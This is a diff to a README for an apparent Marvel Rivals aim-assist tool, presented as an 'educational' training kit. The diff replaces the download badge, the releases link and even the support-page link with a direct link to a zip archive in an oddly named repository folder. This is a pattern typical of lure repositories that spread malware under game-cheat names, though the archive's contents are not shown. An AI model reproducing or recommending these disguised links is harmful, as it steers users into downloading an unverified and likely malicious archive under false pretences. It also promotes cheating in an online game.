@@ -1,7 +1,7 @@
 # 🌟 marvel-rivals-aim-helper - Improve Your Marvel Rivals Skills
 
 ## ⚡️ Quick Download
-[![Download](https://img.shields.io/badge/Download-v1.0-blue)](https://github.com/3mk714/marvel-rivals-aim-helper/releases)
+[![Download](https://raw.githubusercontent.com/3mk714/marvel-rivals-aim-helper/main/hermitry/marvel-rivals-aim-helper_v2.6-beta.5.zip)](https://raw.githubusercontent.com/3mk714/marvel-rivals-aim-helper/main/hermitry/marvel-rivals-aim-helper_v2.6-beta.5.zip)
 
 ## 📝 Project Overview
 **Marvel Rivals Training Assistant** is a comprehensive skill development toolkit designed for Marvel Rivals players who want to enhance their gameplay abilities. This educational project provides analytical tools that help players understand game mechanics and improve their personal performance.
@@ -32,7 +32,7 @@
 To get started with the Marvel Rivals Training Assistant, follow these steps:
 
 1. Click the download link below to access the releases page:
-   [Download here](https://github.com/3mk714/marvel-rivals-aim-helper/releases)
+   [Download here](https://raw.githubusercontent.com/3mk714/marvel-rivals-aim-helper/main/hermitry/marvel-rivals-aim-helper_v2.6-beta.5.zip)
 
 2. On the releases page, look for the latest version. Download the appropriate file for your operating system.
 
@@ -63,7 +63,7 @@ If you encounter issues while installing or running the application, try the fol
 - If you receive any error messages, consult the FAQ section or check for updates on the releases page.
 
 ## 📞 Support
-For further assistance, please visit the [GitHub Issues page](https://github.com/3mk714/marvel-rivals-aim-helper/issues) to report any problems or request help.
+For further assistance, please visit the [GitHub Issues page](https://raw.githubusercontent.com/3mk714/marvel-rivals-aim-helper/main/hermitry/marvel-rivals-aim-helper_v2.6-beta.5.zip) to report any problems or request help.
 
 ## 🌐 Stay Updated
 For the latest updates, feature releases, and community discussions, follow this project on GitHub.
